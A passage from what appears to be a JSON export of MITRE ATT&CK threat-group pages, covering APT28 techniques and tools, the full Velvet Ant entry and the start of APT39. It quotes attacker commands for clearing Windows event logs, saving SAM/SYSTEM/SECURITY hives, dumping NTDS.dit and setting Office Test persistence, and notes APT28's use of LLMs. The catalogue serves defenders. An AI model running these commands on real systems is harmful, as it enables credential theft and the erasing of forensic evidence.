Defenses: Disable or Modify System Firewall During APT28 Nearest Neighbor Campaign, APT28 added rules to a victim's Windows firewall to set up a series of port-forwards allowing traffic to target systems.[27] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs APT28 has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security.[5][3] .004 Indicator Removal: File Deletion APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.[3] .006 Indicator Removal: Timestomp APT28 has performed timestomping on victim files.[5] Enterprise T1105 Ingress Tool Transfer APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.[39][31][17][21][2] Enterprise T1056 .001 Input Capture: Keylogging APT28 has used tools to perform keylogging.[34][3][21] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange APT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents.[44][45][11] Enterprise T1036 Masquerading APT28 has renamed the WinRAR utility to avoid detection.[2] .005 Match Legitimate Resource Name or Location APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.[2] Enterprise T1498 Network Denial of Service In 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.[14] Enterprise T1040 Network Sniffing APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[6][40] APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.[14] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.[39][37][11][18][17] Enterprise T1588 .002 Obtain Capabilities: Tool APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder.[11][22][40] Enterprise T1137 .002 Office Application Startup: Office Test APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\\Software\\Microsoft\\Office test\\Special\\Perf to execute code.[46] Enterprise T1003 OS Credential Dumping APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[47][3][14] .001 LSASS Memory APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[47][3] They have also dumped the LSASS process memory using the MiniDump function.[2] .002 Security Account Manager During APT28 Nearest Neighbor Campaign, APT28 used the following commands to dump SAM, SYSTEM, and SECURITY hives: reg save hklm\\sam, reg save hklm\\system, and reg save hklm\\security.[27] .003 NTDS APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.[2] During APT28 Nearest Neighbor Campaign, APT28 dumped NTDS.dit through creating volume shadow copies via vssadmin.[27] Enterprise T1120 Peripheral Device Discovery APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[34] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments.[37][10][11][3][22][17][21][16] Enterprise T1598 Phishing for Information APT28 has used spearphishing to compromise credentials.[32][16] .003 Spearphishing Link APT28 has conducted credential phishing campaigns with links that redirect to credential harvesting sites.[29][3][13][14][16] Enterprise T1542 .003 Pre-OS Boot: Bootkit APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.[20] Enterprise T1057 Process Discovery An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[31] Enterprise T1090 .001 Proxy: Internal Proxy During APT28 Nearest Neighbor Campaign, APT28 used the built-in netsh portproxy command to create internal proxies on compromised systems.[27] .002 Proxy: External Proxy APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server.[6][39][3] .003 Proxy: Multi-hop Proxy APT28 has routed traffic over Tor and VPN servers to obfuscate their activities.[21] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During APT28 Nearest Neighbor Campaign, APT28 used RDP for lateral movement.[27] .002 Remote Services: SMB/Windows Admin Shares APT28 has mapped network drives using Net and administrator credentials.[2] During APT28 Nearest Neighbor Campaign, APT28 leveraged SMB to transfer files and move laterally.[27] Enterprise T1091 Replication Through Removable Media APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[34] Enterprise T1014 Rootkit APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.[12][48] Enterprise T1113 Screen Capture APT28 has used tools to take screenshots from victims.[47][49][3][16] Enterprise T1596 Search Open Technical Databases APT28 has used large language models (LLMs) to assist in script development and deployment.[42][43] Enterprise T1505 .003 Server Software Component: Web Shell APT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.[2] Enterprise T1528 Steal Application Access Token APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\".[50] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe \"C:\\Windows\\twain_64.dll\". APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.[5][39][11][31][13][2] Enterprise T1016 .002 System Network Configuration Discovery: Wi-Fi Discovery During APT28 Nearest Neighbor Campaign, APT28 collected information on wireless interfaces within range of a compromised system.[27] Enterprise T1221 Template Injection APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. [51] Enterprise T1199 Trusted Relationship Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.[3] Enterprise T1550 .001 Use Alternate Authentication Material: Application Access Token APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.[50] .002 Use Alternate Authentication Material: Pass the Hash APT28 has used pass the hash for lateral movement.[34] Enterprise T1204 .001 User Execution: Malicious Link APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[14][16] .002 User Execution: Malicious File APT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.[37][17][16] Enterprise T1078 Valid Accounts APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[52][3][23][2] .004 Cloud Accounts APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.[2] Enterprise T1102 .002 Web Service: Bidirectional Communication APT28 has used Google Drive for C2.[21] Enterprise T1669 Wi-Fi Networks APT28 has exploited open Wi-Fi access points for initial access to target devices using the network.[27][53] During APT28 Nearest Neighbor Campaign, APT28 established wireless connections to secure, enterprise Wi-Fi networks belonging to a target organization for initial access into the environment.[27] Software ID Name References Techniques S0045 ADVSTORESHELL [19][22] Application Layer Protocol: Web Protocols, Archive Collected Data, Archive Collected Data: Archive via Custom Method, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Component Object Model Hijacking, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Input Capture: Keylogging, Modify Registry, Native API, Obfuscated Files or Information, Peripheral Device Discovery, Process Discovery, Query Registry, Scheduled Transfer, System Binary Proxy Execution: Rundll32, System Information Discovery S0351 Cannon [33][51] Application Layer Protocol: Mail Protocols, Boot or Logon Autostart Execution: Winlogon Helper DLL, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Process Discovery, Screen Capture, System Information Discovery, System Owner/User Discovery, System Time Discovery S0160 certutil [37][2] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0023 CHOPSTICK [6][19][22][16] Application Layer Protocol: Mail Protocols, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter, Communication Through Removable Media, Dynamic Resolution: Domain Generation Algorithms, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, Fallback Channels, File and Directory Discovery, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information: Fileless Storage, Proxy: Internal Proxy, Query Registry, Replication Through Removable Media, Screen Capture, Software Discovery: Security Software Discovery, Virtualization/Sandbox Evasion S1205 cipher.exe [27] Disk Wipe: Disk Content Wipe S0137 CORESHELL [6][16] Application Layer Protocol: Web Protocols, Application Layer Protocol: Mail Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information, System Binary Proxy Execution: Rundll32, System Information Discovery S0243 DealersChoice [10][16] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Exploitation for Client Execution S0134 Downdelph [20][16] Abuse Elevation Control Mechanism: Bypass User Account Control, Data Obfuscation: Junk Data, Encrypted Channel: Symmetric Cryptography, Hijack Execution Flow: DLL, Ingress Tool Transfer S0502 Drovorub [1] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Kernel Modules and Extensions, Command and Scripting Interpreter: Unix Shell, Data from Local System, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Non-Application Layer Protocol, Obfuscated Files or Information, Proxy: Internal Proxy, Rootkit S0193 Forfiles [36] Data from Local System, File and Directory Discovery, Indirect Command Execution S0410 Fysbis [54] Boot or Logon Autostart Execution: XDG Autostart Entries, Command and Scripting Interpreter: Unix Shell, Create or Modify System Process: Systemd Service, Data Encoding: Standard Encoding, File and Directory Discovery, Indicator Removal: File Deletion, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, System Information Discovery S0135 HIDEDRV [20] Process Injection: Dynamic-link Library Injection, Rootkit S0044 JHUHUGIT [8][19][22][14][16] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Initialization Scripts: Logon Script (Windows), Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Event Triggered Execution: Component Object Model Hijacking, Exploitation for Privilege Escalation, Fallback Channels, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Process Injection, Scheduled Task/Job: Scheduled Task, Screen Capture, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery S0250 Koadic [11] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel: Asymmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Network Service Discovery, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, Process Injection: Dynamic-link Library Injection, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Mshta, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Services: Service Execution, Windows Management Instrumentation S0162 Komplex [49][55][16] Application Layer Protocol: Web Protocols, Create or Modify System Process: Launch Agent, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Process Discovery, System Owner/User Discovery S0397 LoJax [48] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Hide Artifacts: NTFS File Attributes, Modify Registry, Pre-OS Boot: System Firmware, Rootkit S0002 Mimikatz [19] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0108 netsh APT28[27]APT28 Nearest Neighbor Campaign[27] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0138 OLDBAIT [6] Application Layer Protocol: Mail Protocols, Application Layer Protocol: Web Protocols, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information S1187 reGeorg [56] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Python, Ingress Tool Transfer, Non-Application Layer Protocol, Protocol Tunneling, Proxy, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: SMB/Windows Admin Shares, Server Software Component: Web Shell S0174 Responder [40][14] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Network Sniffing S0183 Tor [2] Encrypted Channel: Asymmetric Cryptography, Proxy: Multi-hop Proxy S0136 USBStealer [20] Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Communication Through Removable Media, Data from Removable Media, Data Staged: Local Data Staging, Exfiltration Over Physical Medium: Exfiltration over USB, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Peripheral Device Discovery, Replication Through Removable Media S0645 Wevtutil [5] Data from Local System, Impair Defenses: Disable Windows Event Logging, Indicator Removal: Clear Windows Event Logs S0191 Winexe [36][16] System Services: Service Execution S0314 X-Agent for Android [57] Location Tracking, Masquerading: Match Legitimate Name or Location S0161 XAgentOSX [49][12][14] Application Layer Protocol: File Transfer Protocols, Credentials from Password Stores: Credentials from Web Browsers, File and Directory Discovery, Indicator Removal: File Deletion, Input Capture: Keylogging, Native API, Process Discovery, Screen Capture, System Information Discovery, System Owner/User Discovery S0117 XTunnel [20][12][14][16] Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Asymmetric Cryptography, Fallback Channels, Network Service Discovery, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information, Proxy, Unsecured Credentials: Credentials In Files S0251 Zebrocy [11][33][22][51][13] Application Layer Protocol: Mail Protocols, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Initialization Scripts: Logon Script (Windows), Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Credential API Hooking, Network Share Discovery, Obfuscated Files or Information: Software Packing, Peripheral Device Discovery, Process Discovery, Query Registry, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Time Discovery, Windows Management Instrumentation References NSA/FBI. (2020, August). Russian GRU 85th GTsSS Deploys Previously Undisclosed Drovorub Malware. Retrieved August 25, 2020. NSA, CISA, FBI, NCSC. (2021, July). Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments. Retrieved July 26, 2021. Mueller, R. (2018, July 13). Indictment - United States of America vs. VIKTOR BORISOVICH NETYKSHO, et al. Retrieved November 17, 2024. Gallagher, S. (2018, July 27). How they did it (and will likely try again): GRU hackers vs. US elections. Retrieved September 13, 2018. Alperovitch, D.. (2016, June 15). Bears in the Midst: Intrusion into the Democratic National Committee. Retrieved August 3, 2016. FireEye. (2015). APT28: A WINDOW INTO RUSSIA\u2019S CYBER ESPIONAGE OPERATIONS?. Retrieved August 19, 2015. SecureWorks Counter Threat Unit Threat Intelligence. (2016, June 16). Threat Group-4127 Targets Hillary Clinton Presidential Campaign. Retrieved August 3, 2016. FireEye iSIGHT Intelligence. (2017, January 11). APT28: At the Center of the Storm. Retrieved November 17, 2024. Department of Homeland Security and Federal Bureau of Investigation. (2016, December 29). GRIZZLY STEPPE \u2013 Russian Malicious Cyber Activity. Retrieved January 11, 2017. Falcone, R. (2018, March 15). Sofacy Uses DealersChoice to Target European Government Agency. Retrieved June 4, 2018. Lee, B., Falcone, R. (2018, June 06). Sofacy Group\u2019s Parallel Attacks. Retrieved June 18, 2018. Symantec Security Response. (2018, October 04). APT28: New Espionage Operations Target Military and Government Organizations. Retrieved November 14, 2018. ESET Research. (2019, May 22). A journey to Zebrocy land. Retrieved June 20, 2019. Brady, S . (2018, October 3). Indictment - United States vs Aleksei Sergeyevich Morenets, et al.. Retrieved October 1, 2020. Secureworks CTU. (n.d.). IRON TWILIGHT. Retrieved February 28, 2022. Secureworks CTU. (2017, March 30). IRON TWILIGHT Supports Active Measures. Retrieved February 28, 2022. Accenture Security. (2018, November 29). SNAKEMACKEREL. Retrieved April 15, 2019. Mercer, W., et al. (2017, October 22). \"Cyber Conflict\" Decoy Document Used in Real Cyber Conflict. Retrieved November 2, 2018. Kaspersky Lab's Global Research and Analysis Team. (2015, December 4). Sofacy APT hits high profile targets with updated toolset. Retrieved December 10, 2015. ESET. (2016, October). En Route with Sednit - Part 3: A Mysterious Downloader. Retrieved November 21, 2016. Hacquebord, F., Remorin, L. (2020, December 17). Pawn Storm\u2019s Lack of Sophistication as a Strategy. Retrieved January 13, 2021. Kaspersky Lab's Global Research & Analysis Team. (2018, February 20). A Slice of 2017 Sofacy Activity. Retrieved November 27, 2018. MSRC Team. (2019, August 5). Corporate IoT \u2013 a path to intrusion. Retrieved August 16, 2019. Microsoft Threat Intelligence Center (MSTIC). (2020, September 10). STRONTIUM: Detecting new patterns in credential harvesting. Retrieved September 11, 2020. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Billy Leonard. (2023, April 19). Ukraine remains Russia\u2019s biggest cyber focus in 2023. Retrieved March 1, 2024. Koessel, Sean. Adair, Steven. Lancaster, Tom. (2024, November 22). The Nearest Neighbor Attack: How A Russian APT Weaponized Nearby Wi-Fi Networks for Covert Access. Retrieved February 25, 2025. FireEye Labs. (2015, April 18). Operation RussianDoll: Adobe & Windows Zero-Day Exploits Likely Leveraged by Russia\u2019s APT28 in Highly-Targeted Attack. Retrieved April 24, 2017. Huntley, S. (2022, March 7). An update on the threat landscape. Retrieved March 16, 2022. Hacquebord, F. (n.d.). Pawn Storm in 2019 A Year of Scanning and Credential Phishing on High-Profile Targets. Retrieved December 29, 2020. Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. Burt, T. (2020, September 10). New cyberattacks targeting U.S. elections. Retrieved March 24, 2021. Falcone, R., Lee, B. (2018, November 20). Sofacy Continues Global Attacks and Wheels Out New \u2018Cannon\u2019 Trojan. Retrieved November 26, 2018. Anthe, C. et al. (2015, October 19). Microsoft Security Intelligence Report Volume 19. Retrieved December 23, 2015. Maccaglia, S. (2015, November 4). Evolving Threats: dissection of a CyberEspionage attack. Retrieved April 4, 2018. Guarnieri, C. (2015, June 19). Digital Attack on German Parliament: Investigative Report on the Hack of the Left Party Infrastructure in Bundestag. Retrieved January 22, 2018. Lee, B, et al. (2018, February 28). Sofacy Attacks Multiple Government Entities. Retrieved March 15, 2018. ESET. (2016, October). En Route with Sednit - Part 1: Approaching the Target. Retrieved November 8, 2016. Bitdefender. (2015, December). APT28 Under the Scope. Retrieved February 23, 2017. Smith, L. and Read, B.. (2017, August 11). APT28 Targets Hospitality Sector, Presents Threat to Travelers. Retrieved November 17, 2024. Microsoft. (2017, March 14). Microsoft Security Bulletin MS17-010 - Critical. Retrieved August 17, 2017. Microsoft Threat Intelligence. (2024, February 14). Staying ahead of threat actors in the age of AI. Retrieved March 11, 2024. OpenAI. (2024, February 14). Disrupting malicious uses of AI by state-affiliated threat actors. Retrieved September 12, 2024. Sherstobitoff, R., Rea, M. (2017, November 7). Threat Group APT28 Slips Office Malware into Doc Citing NYC Terror Attack. Retrieved November 21, 2017. Paganini, P. (2017, November 9). Russia-Linked APT28 group observed using DDE attack to deliver malware. Retrieved November 21, 2017. Falcone, R. (2016, July 20). Technical Walkthrough: Office Test Persistence Method Used In Recent Sofacy Attacks. Retrieved July 3, 2017. ESET. (2016, October). En Route with Sednit - Part 2: Observing the Comings and Goings. Retrieved November 21, 2016. ESET. (2018, September). LOJAX First UEFI rootkit found in the wild, courtesy of the Sednit group. Retrieved July 2, 2019. Robert Falcone. (2017, February 14). XAgentOSX: Sofacy's Xagent macOS Tool. Retrieved July 12, 2017. Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019. Lee, B., Falcone, R. (2018, December 12). Dear Joohn: The Sofacy Group\u2019s Global Campaign. Retrieved April 19, 2019. Hacquebord, F.. (2017, April 25). Two Years of Pawn Storm: Examining an Increasingly Relevant Threat. Retrieved May 3, 2017. U.S. Department of Justice. (2018, October 4). U.S. Charges Russian GRU Officers with International Hacking and Related Influence and Disinformation Operations. Retrieved February 25, 2025. Bryan Lee and Rob Downs. (2016, February 12). A Look Into Fysbis: Sofacy\u2019s Linux Backdoor. Retrieved September 10, 2017. Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017. Paganini, P. (2023, October 27). France agency ANSSI warns of Russia-linked APT28 attacks on French entities. Retrieved December 3, 2024. CrowdStrike Global Intelligence Team. (2016). Use of Fancy Bear Android Malware in Tracking of Ukrainian FIeld Artillery Units. Retrieved February 6, 2017. "
},
{
"id": 55,
"title": "Velvet Ant, Group G1047",
"path": "/groups/G1047/index.html",
"content": " Velvet Ant Velvet Ant is a threat actor operating since at least 2021. Velvet Ant is associated with complex persistence mechanisms, the targeting of network devices and appliances during operations, and the use of zero day exploits.[1][2] ID: G1047 Contributors: Oren Biderman, Sygnia; Amnon Kushnir, Sygnia Version: 1.0 Created: 14 March 2025 Last Modified: 04 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 Application Layer Protocol Velvet Ant has used reverse SSH tunnels to communicate to victim devices.[1] Enterprise T1037 .004 Boot or Logon Initialization Scripts: RC Scripts Velvet Ant used a modified /etc/rc.local file on compromised F5 BIG-IP devices to maintain persistence.[1] Enterprise T1059 .004 Command and Scripting Interpreter: Unix Shell Velvet Ant used a custom tool, VELVETSTING, to parse encoded inbound commands to compromised F5 BIG-IP devices and then execute them via the Unix shell.[1] Enterprise T1132 Data Encoding Velvet Ant sent commands to compromised F5 BIG-IP devices in an encoded format requiring a passkey before interpretation and execution.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography Velvet Ant has used a reverse SSH shell to securely communicate with victim devices.[1] Enterprise T1211 Exploitation for Defense Evasion Velvet Ant exploited CVE-2024-20399 in Cisco Switches to which the threat actor was already able to authenticate in order to escape the NX-OS command line interface and gain access to the underlying operating system for arbitrary command execution.[2] Enterprise T1133 External Remote Services Velvet Ant has leveraged access to internet-facing remote services to compromise and retain access to victim environments.[1] Enterprise T1083 File and Directory Discovery Velvet Ant has enumerated local files and folders on victim devices.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL Velvet Ant has used malicious DLLs executed via legitimate EXE files through DLL search order hijacking to launch follow-on payloads such as PlugX.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Velvet Ant attempted to disable local security tools and endpoint detection and response (EDR) software during operations.[1] .004 Impair Defenses: Disable or Modify System Firewall Velvet Ant modified system firewall settings during PlugX installation using netsh.exe to open a listening, random high number port on victim devices.[1] Enterprise T1570 Lateral Tool Transfer Velvet Ant transferred files laterally within victim networks through the Impacket toolkit.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Velvet Ant used a malicious DLL, iviewers.dll, that mimics the legitimate \"OLE/COM Object Viewer\" within Windows.[1] Enterprise T1040 Network Sniffing Velvet Ant has used a custom tool, \"VELVETTAP\", to perform packet capture from compromised F5 BIG-IP devices.[1] Enterprise T1571 Non-Standard Port Velvet Ant has used random high number ports for PlugX listeners on victim devices.[1] Enterprise T1055 Process Injection Velvet Ant initial execution included launching multiple svchost processes and injecting code into them.[1] Enterprise T1090 .001 Proxy: Internal Proxy Velvet Ant has tunneled traffic from victims through an internal, compromised host to proxy communications to command and control nodes.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Velvet Ant has transferred tools within victim environments using SMB.[1] Enterprise T1049 System Network Connections Discovery Velvet Ant has enumerated existing network connections on victim devices.[1] Enterprise T1569 .002 System Services: Service Execution Velvet Ant executed and installed PlugX as a Windows service.[1] Enterprise T1078 .003 Valid Accounts: Local Accounts Velvet Ant accessed vulnerable Cisco switch devices using accounts with administrator privileges.[2] Enterprise T1047 Windows Management Instrumentation Velvet Ant used the wmiexec.py tool within Impacket for remote process execution via WMI.[1] Software ID Name References Techniques S0357 Impacket Velvet Ant used Impacket for lateral tool transfer and remote process execution.[1] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0013 PlugX Velvet Ant heavily relies on variants of PlugX for various phases of operations.[1] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver References Sygnia Team. (2024, June 3). China-Nexus Threat Group \u2018Velvet Ant\u2019 Abuses F5 Load Balancers for Persistence. Retrieved March 14, 2025. Sygnia Team. (2024, July 1). China-Nexus Threat Group \u2018Velvet Ant\u2019 Exploits Cisco Zero-Day (CVE-2024-20399) to Compromise Nexus Switch Devices \u2013 Advisory for Mitigation and Response. Retrieved March 14, 2025. "
},
{
"id": 56,
"title": "APT39, ITG07, Chafer, Remix Kitten, Group G0087",
"path": "/groups/G0087/index.html",
"content": " APT39 APT39 is one of several names for cyber espionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at least 2014. APT39 has primarily targeted the travel, hospitality, academic, and telecommunications industries in Iran and across Asia, Africa, Europe, and North America to track individuals and entities considered to be a threat by the MOIS.[1][2][3][4][5] ID: G0087 \u24d8 Associated Groups: ITG07, Chafer, Remix Kitten Version: 3.2 Created: 19 February 2019 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description ITG07 [3][4][5] Chafer Activities associated with APT39 largely align with a group publicly referred to as Chafer.[1][2][6][3][4][5] Remix Kitten [7] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT39 has used HTTP in communications with C2.[8][3] .004 Application Layer Protocol: DNS APT39 has used remote access tools that leverage DNS in communications with C2.[8] Enterprise T1560 .001 Archive Collected Data: Archive via Utility APT39 has used WinRAR and 7-Zip to compress an archive stolen data.[1] Enterprise T1197 BITS Jobs APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT39 has maintained persistence using the startup folder.[1] .009 Boot or Logon Autostart Execution: Shortcut Modification APT39 has modified LNK shortcuts.[1] Enterprise T1110 Brute Force APT39 has used Ncrack to reveal credentials.[1] Enterprise T1115 Clipboard Data APT39 has used tools capable of stealing contents of the clipboard.[9] Enterprise T1059 Command and Scripting Interpreter APT39 has utilized custom scripts to perform internal reconnaissance.[1][3] .001 PowerShell APT39 has used PowerShell to execute malicious 